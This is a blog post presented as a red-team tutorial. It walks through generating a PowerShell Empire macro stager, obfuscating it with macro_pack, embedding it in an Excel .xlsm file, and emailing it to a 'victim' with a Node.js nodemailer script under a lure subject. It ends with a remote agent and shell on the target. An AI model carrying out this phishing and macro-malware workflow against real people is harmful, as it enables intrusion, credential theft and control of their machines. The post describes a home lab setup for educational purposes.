---
layout: post
title: Red Teaming - Macros & Phishing
date: 2021-11-04
categories: [malware, phishing, nodejs, gmail, starkiller, macros]
---

## Intro

***Only for educational purposes.***
***I am not responsible for any illegal use.***

## Kali


#### Empire

```bash
sudo powershell-empire server
```

![image](/assets/img/redteam1/1.png)

#### StarKiller

```
Default creds -> empireadmin:password123
```

- View Listener

![image](/assets/img/redteam1/2.png)

- Create Stager 

```
windows/macro
```

![image](/assets/img/redteam1/3.png)

- Copy the Macro 

![image](/assets/img/redteam1/4.png)

- Start C# Empire Server

![image](/assets/img/redteam1/5.png)

## Windows

- paste the macro stager to the windows vm
- macro.vba

![image](/assets/img/redteam1/6.png)

#### Macro Pack

Download Here : [macro_pack](https://github.com/sevagas/macro_pack/releases/)

```powershell
.\macro_pack.exe -f C:\Users\dmtrs\Documents\macro.vba -o -G C:\Users\dmtrs\Documents\obs_macro.vba
```

![image](/assets/img/redteam1/7.png)

- the new obfuscated vba

![image](/assets/img/redteam1/8.png)

## Malicious Excel (Manually)

- Create a new blank excel

- Developer -> macros

![image](/assets/img/redteam1/9.png)

![image](/assets/img/redteam1/10.png)

![image](/assets/img/redteam1/11.png)

- Replace the empty function with the obs_macro's contents

![image](/assets/img/redteam1/12.png)

- Save it as xlsm

![image](/assets/img/redteam1/13.png)


###### Next Tasks

- Copy the Company.xlsm to our kali
- Send via email the xlsm using the nodejs nodemailer 

## Kali

- Make sure that the attacker's email has got the lesssecureapps enabled 

- https://myaccount.google.com/lesssecureapps

- filename app.js

```bash
node app.js
```

```javascript
var nodemailer = require('nodemailer');

var mail = nodemailer.createTransport({
    service: 'gmail',
    auth: {
		//your gmail credentials
        user: 'evil.sender@example.com',
        pass: 'simpleExamplePassword'
    }
});

var mailOptions = {
    from: 'evil.sender@example.com', //your evil gmail
    to: 'victim@example.com', // victims gmail
    subject: 'Confidential Document',
    text: 'Please do not share the attached xls',
   
    attachments: [

        {   // file on disk as an attachment
            filename: 'Company.xlsm',
            path: 'Company.xlsm' // stream this file
        }
    ]
    
};

mail.sendMail(mailOptions, function (error, info) {
    if (error) {
        console.log(error);
    } else {
        console.log('Email sent: ' + info.response);
    }
});
```

- Result

Email sended

![image](/assets/img/redteam1/14.png)

## Victims Emails

![image](/assets/img/redteam1/15.png)

- I send it to my self but if you send it to other account, google will notify them that maybe is a phishing email and it will send it to spam

![image](/assets/img/redteam1/16.png)

## Victim Computer

***Security Measures are Disabled***

- Download the file 
- Enable Editing

![image](/assets/img/redteam1/17.png)

- Enable Content

![image](/assets/img/redteam1/18.png)

- Run Macro

![image](/assets/img/redteam1/19.png)

## Agent Created (Kali)

![image](/assets/img/redteam1/20.png)

- File Browser

![image](/assets/img/redteam1/21.png)

- Interact /  Shell Command

![image](/assets/img/redteam1/22.png)

## Virus Total

![image](/assets/img/redteam1/23.png)

## Conclusion

Obviously we could use and combine more obfuscation techniques with better performance. 

Additionally we could not send the file directly but a link for the user to download the file. 

Finally, with the use of various tools such as LuckyStrike we could not put the user in the process of running macros. 

This was a very simple example and I presented it for educational purposes.


***Only for educational purposes.***
***I am not responsible for any illegal use.***





